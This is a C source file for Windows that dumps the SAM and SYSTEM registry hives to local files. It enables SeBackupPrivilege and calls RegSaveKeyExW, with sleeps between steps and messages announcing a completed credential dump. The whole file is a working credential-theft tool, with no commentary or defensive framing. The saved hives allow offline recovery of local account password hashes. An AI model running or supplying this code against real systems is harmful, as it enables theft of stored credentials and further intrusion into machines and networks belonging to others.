#include <stdio.h>
#include <windows.h>

#ifdef _MSC_VER
#pragma comment(lib, "advapi32.lib")
#endif

static BOOL enableSeBackupPrivilege(void);
static BOOL executeCredDump(LPCWSTR hive, LPCWSTR outPath);

static BOOL enableSeBackupPrivilege(void)
{
    HANDLE          hToken;
    LUID            luid;
    TOKEN_PRIVILEGES tp;

    if (!OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &hToken)) {
        fwprintf(stderr,
            L"[!] OpenProcessToken failed: %lu\n",
            GetLastError());
        return FALSE;
    }

    if (!LookupPrivilegeValueW(NULL, L"SeBackupPrivilege", &luid)) {
        fwprintf(stderr,
            L"[!] LookupPrivilegeValue failed: %lu\n",
            GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL)) {
        fwprintf(stderr,
            L"[!] AdjustTokenPrivileges failed: %lu\n",
            GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

static BOOL executeCredDump(LPCWSTR hive, LPCWSTR outPath)
{
    DWORD   attrs;
    HKEY    hKey;
    LSTATUS status;

    attrs = GetFileAttributesW(outPath);
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        wprintf(L"[*] %s already exists, removing\n", outPath);
        if (!DeleteFileW(outPath)) {
            fwprintf(stderr,
                L"[!] DeleteFile failed: %lu\n",
                GetLastError());
            return FALSE;
        }
    }

    if (!enableSeBackupPrivilege()) {
        fwprintf(stderr,
            L"[!] failed to enable SeBackupPrivilege"
            L" (run as Administrator)\n");
        return FALSE;
    }

    status = RegOpenKeyExW(
        HKEY_LOCAL_MACHINE, hive, 0, KEY_READ, &hKey);
    if (status != ERROR_SUCCESS) {
        fwprintf(stderr,
            L"[!] RegOpenKeyExW failed: %ld\n", status);
        return FALSE;
    }

    status = RegSaveKeyExW(hKey, outPath, NULL, REG_LATEST_FORMAT);
    RegCloseKey(hKey);
    if (status != ERROR_SUCCESS) {
        fwprintf(stderr,
            L"[!] RegSaveKeyExW failed: %ld\n", status);
        return FALSE;
    }

    wprintf(L"[+] %s hive saved to %s\n", hive, outPath);
    return TRUE;
}

int main(void)
{
    Sleep(10000);

    if (!executeCredDump(L"SAM", L"SAM.hive")) {
        fwprintf(stderr, L"[!] failed to dump SAM hive\n");
        return 1;
    }

    Sleep(10000);

    if (!executeCredDump(L"SYSTEM", L"SYSTEM.hive")) {
        fwprintf(stderr, L"[!] failed to dump SYSTEM hive\n");
        return 1;
    }

    wprintf(L"[+] Done - credential dump completed successfully\n");
    wprintf(L"[+] WOOOOO! Have a nice Day!\n");
    return 0;
}
